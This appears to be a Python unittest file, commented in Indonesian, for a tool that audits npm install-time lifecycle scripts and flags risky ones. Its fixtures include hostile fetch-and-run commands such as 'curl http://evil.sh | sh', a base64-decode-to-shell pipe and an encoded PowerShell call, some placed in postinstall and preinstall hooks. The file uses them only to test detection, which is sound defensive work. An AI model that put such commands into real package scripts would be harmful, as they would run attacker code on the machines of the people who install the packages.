"""Nol jaringan — test npm_script_audit (audit lifecycle-script npm).

Fixtures package.json dibangun inline di direktori sementara; tidak ada
request jaringan dan tidak ada paket yang diinstal.
"""
from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
for sub in ("core", "tools"):
    sys.path.insert(0, str(ROOT / sub))

import npm_script_audit as nsa  # noqa: E402
from findings import validate_finding  # noqa: E402


def _pkg(name: str, version: str = "1.0.0", scripts: dict | None = None,
         **extra) -> str:
    doc: dict = {"name": name, "version": version}
    if scripts is not None:
        doc["scripts"] = scripts
    doc.update(extra)
    return json.dumps(doc, indent=2)


def _mk_project(td: Path, packages: dict[str, str],
                root_scripts: dict | None = None) -> Path:
    """Bangun pohon proyek fixture: package.json akar + node_modules/<pkg>."""
    (td / "package.json").write_text(
        _pkg("root-app", "2.1.0", scripts=root_scripts), encoding="utf-8")
    nm = td / "node_modules"
    nm.mkdir(exist_ok=True)
    for name, body in packages.items():
        pdir = nm / name
        if "/" in name:  # scoped @scope/pkg
            pdir = nm / name
        pdir.mkdir(parents=True, exist_ok=True)
        (pdir / "package.json").write_text(body, encoding="utf-8")
    return td


class TestClassify(unittest.TestCase):
    """Skoring isi script — deterministik."""

    def test_curl_pipe_sh_high(self):
        sev, reason = nsa.classify_script("curl http://evil.sh | sh")
        self.assertEqual(sev, "high")
        self.assertIn("shell", reason)

    def test_node_eval_high(self):
        self.assertEqual(nsa.classify_script('node -e "require(id)"')[0],
                         "high")

    def test_base64_decode_high(self):
        self.assertEqual(nsa.classify_script("echo dda | base64 -d | sh")[0],
                         "high")

    def test_powershell_enc_high(self):
        self.assertEqual(nsa.classify_script("powershell -enc AAAA")[0],
                         "high")

    def test_build_biasa_low(self):
        sev, _ = nsa.classify_script("node-gyp rebuild")
        self.assertEqual(sev, "low")

    def test_npm_run_low(self):
        self.assertEqual(nsa.classify_script("npm run compile")[0], "low")


class TestManifestFindings(unittest.TestCase):
    def test_hanya_lifecycle_yang_diambil(self):
        p = Path("pkg/package.json")
        doc = json.loads(_pkg("x", scripts={
            "preinstall": "echo pre", "test": "jest", "build": "tsc"}))
        f = nsa.manifest_findings(p, doc, "x")
        self.assertEqual(len(f), 1)
        # make_finding me-flatten kunci extra ke level atas dict
        self.assertEqual(f[0]["npm_lifecycle"], "preinstall")
        self.assertEqual(f[0]["verdict"], 0)
        self.assertEqual(validate_finding(f[0]), [])

    def test_scripts_hilang_tanpa_temuan(self):
        doc = json.loads(_pkg("x"))
        self.assertEqual(nsa.manifest_findings(Path("p"), doc, "x"), [])

    def test_high_risk_postinstall(self):
        doc = json.loads(_pkg("wormy", scripts={
            "postinstall": "curl http://x.sh | sh"}))
        f = nsa.manifest_findings(Path("p"), doc, "wormy")
        self.assertEqual(f[0]["severity"], "high")
        self.assertEqual(f[0]["target_url"], "file:npm:wormy@1.0.0")


class TestAuditRoot(unittest.TestCase):
    def test_pohon_lengkap_end_to_end(self):
        with tempfile.TemporaryDirectory() as td_s:
            td = Path(td_s)
            _mk_project(td, {
                "lodash": _pkg("lodash", "4.17.21", scripts={
                    "postinstall": "node scripts/prepare.js"}),
                "clean-pkg": _pkg("clean-pkg", "0.1.0"),
                "@scope/lib": _pkg("@scope/lib", "3.0.0", scripts={
                    "prepare": "npm run build"}),
            }, root_scripts=None)
            findings, meta = nsa.audit_root(td)
            self.assertEqual(meta["manifests_scanned"], 4)  # root + 3 pkg
            # clean-pkg + root-app (tanpa scripts) = 2
            self.assertEqual(meta["packages_without_lifecycle"], 2)
            titles = [f["title"] for f in findings]
            self.assertTrue(any("postinstall pada lodash@4.17.21" in t
                                for t in titles))
            self.assertTrue(any("prepare pada @scope/lib@3.0.0" in t
                                for t in titles))
            for f in findings:
                self.assertEqual(validate_finding(f), [])

    def test_root_tanpa_package_json_fail_closed(self):
        with tempfile.TemporaryDirectory() as td_s:
            with self.assertRaises(ValueError):
                nsa.audit_root(Path(td_s))

    def test_root_bukan_direktori_fail_closed(self):
        with self.assertRaises(ValueError):
            nsa.audit_root(Path(ROOT / "tests" / "TIDAK-ADA-DIR"))

    def test_manifest_rusak_dihitung_bukan_crash(self):
        """Manifest anak tidak terbaca -> meta.unreadable, bukan klaim bersih."""
        with tempfile.TemporaryDirectory() as td_s:
            td = Path(td_s)
            _mk_project(td, {"bad": "{{{ bukan json", "ok":
                             _pkg("ok", "1.0.0")})
            findings, meta = nsa.audit_root(td)
            self.assertEqual(len(meta["manifests_unreadable"]), 1)
            self.assertEqual(meta["manifests_scanned"], 2)  # root + ok
            self.assertEqual(findings, [])

    def test_nested_node_modules_terbaca(self):
        with tempfile.TemporaryDirectory() as td_s:
            td = Path(td_s)
            _mk_project(td, {"outer": _pkg("outer", "1.0.0")})
            nested = td / "node_modules" / "outer" / "node_modules" / "inner"
            nested.mkdir(parents=True)
            (nested / "package.json").write_text(
                _pkg("inner", "0.2.0", scripts={
                    "preinstall": "curl x | sh"}), encoding="utf-8")
            findings, meta = nsa.audit_root(td)
            self.assertEqual(meta["manifests_scanned"], 3)
            self.assertEqual(len(findings), 1)
            self.assertEqual(findings[0]["severity"], "high")


class TestCLI(unittest.TestCase):
    def test_main_mode_root(self):
        with tempfile.TemporaryDirectory() as td_s:
            td = Path(td_s)
            _mk_project(td, {"lodash": _pkg("lodash", "4.17.21", scripts={
                "install": "node-gyp rebuild"})})
            out = td.parent / "out" / "findings.json"
            rc = nsa.main(["--root", str(td), "--out", str(out)])
            self.assertEqual(rc, 0)
            doc = json.loads(out.read_text(encoding="utf-8"))
            self.assertTrue(doc["ok"])
            self.assertEqual(len(doc["findings"]), 1)
            self.assertEqual(validate_finding(doc["findings"][0]), [])

    def test_main_mode_manifest(self):
        with tempfile.TemporaryDirectory() as td_s:
            td = Path(td_s)
            m = td / "package.json"
            m.write_text(_pkg("solo", "9.9.9", scripts={
                "postinstall": "echo hi"}), encoding="utf-8")
            out = td / "f.json"
            rc = nsa.main(["--manifest", str(m), "--out", str(out)])
            self.assertEqual(rc, 0)
            doc = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(doc["data"]["manifests_scanned"], 1)

    def test_main_input_hancur_exit_2(self):
        with tempfile.TemporaryDirectory() as td_s:
            rc = nsa.main(["--root", td_s,
                           "--out", str(Path(td_s) / "o.json")])
            self.assertEqual(rc, 2)
            bad = Path(td_s) / "bad.json"
            bad.write_text("{{{", encoding="utf-8")
            rc = nsa.main(["--manifest", str(bad),
                           "--out", str(Path(td_s) / "o2.json")])
            self.assertEqual(rc, 2)


if __name__ == "__main__":
    unittest.main()
